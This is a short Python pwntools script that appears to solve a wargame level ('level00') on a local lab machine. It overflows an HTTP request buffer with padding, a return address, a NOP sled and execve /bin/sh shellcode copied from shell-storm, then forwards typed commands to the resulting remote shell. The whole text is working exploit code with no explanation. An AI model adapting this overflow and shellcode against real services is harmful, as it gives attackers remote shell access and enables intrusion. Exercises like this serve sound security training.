from pwn import *

#$ ip a
addr = "192.168.56.103"
#$ sudo netstat -lptu | grep level00
port = 20000

r = remote(addr, port)
print(r.readline())

shellcode_addr = 0xbffff8f8 + 200
#Found at http://shell-storm.org/shellcode/files/shellcode-811.php
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"

r.send(b"GET " + b"A" * 139 + p32(shellcode_addr) + b" HTTP/1.1" + b"\x90" * 200 + shellcode)
#I would have preferred to use interactive(), but it ends each line with \r and bash did not like that.
while True:
    r.send(input() + "\n")
    print(r.read())
